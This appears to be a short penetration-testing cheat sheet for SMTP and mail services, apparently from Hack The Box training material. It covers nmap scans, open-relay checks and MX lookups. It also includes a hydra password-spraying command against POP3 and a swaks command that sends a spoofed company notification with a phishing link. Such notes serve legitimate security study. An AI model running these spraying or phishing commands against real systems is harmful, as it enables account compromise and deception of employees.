## SMTP

```bash
$ nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $TARGET
$ nmap -p25 -Pn --script smtp-open-relay $TARGET

$ telnet $TARGET 25

$ host -t MX hackthebox.eu
$ host -t A mail1.inlanefreight.htb

$ dig mx plaintext.do | grep "MX" | grep -v ";"
$ dig mx inlanefreight.com | grep "MX" | grep -v ";"

$ hydra -L users.txt -p 'Company01!' -f $TARGET pop3
$ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $TARGET
```